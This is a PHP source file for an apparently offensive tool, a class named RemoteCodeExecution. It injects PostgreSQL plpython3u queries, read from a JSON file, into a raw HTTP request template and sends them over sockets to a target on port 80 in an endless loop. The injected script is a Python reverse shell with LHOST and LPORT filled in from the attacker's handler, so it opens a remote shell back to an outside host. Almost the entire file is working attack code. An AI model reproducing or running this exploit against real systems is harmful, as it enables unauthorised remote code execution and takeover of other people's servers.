<?php
    Class RemoteCodeExecution{
        public function init($target,$http_payload,$master,$original){
            $this->root=$original;
            $this->handler=$master;
            $this->payload=$http_payload;
            $this->const=$http_payload;
            $this->target=$target;
            $this->scripts=array(file_get_contents("scripts/shell.py"));
            $this->LANG=array("Python","plpython3u");

        }
        public function exploit(){
            $stage=0;
            foreach(explode("\r\n",$this->payload) as $var){
            try{
            if (strpos($var,"formatted")){ $stage++;}
            }catch(exception $error){echo "error";}}
            $stage=$stage-1;
            echo "formats : $stage";
            $i=0;
            while(True){
            foreach(explode("\r\n",$this->payload) as $var){
            foreach($this->LANG as $lang){
                foreach($this->scripts as $script){
                foreach(json_decode(file_get_contents('queries.json'),true)["others"] as $query){
                    $script=str_replace("LPORT",$this->handler[1],$script);
                    $script=str_replace("LHOST",$this->handler[0],$script);
                    $query=str_replace("LANG",$lang,$query);
                    $query=str_replace("SCRIPT",$script,$query);
                    $this->sock=socket_create(AF_INET,SOCK_STREAM,0);
            try{socket_connect($this->sock,str_replace(" ","",$this->target),80);echo "connected!";}catch(exception $error){
            echo "Invalid Target :(";exit;
            }
                    $this->payload=str_replace("formatted".(String)$i,urlencode($query),$this->const);
                    echo $this->payload;
                    //echo "alter: $i.\n";
                    $i=$i+1;
                    if ($i==$stage){$i=0;}
                    socket_write($this->sock,$this->payload);
                    //echo socket_read($this->sock,2048);
                    socket_close($this->sock);

                 }}}
            }
        }
        }
    }
?>
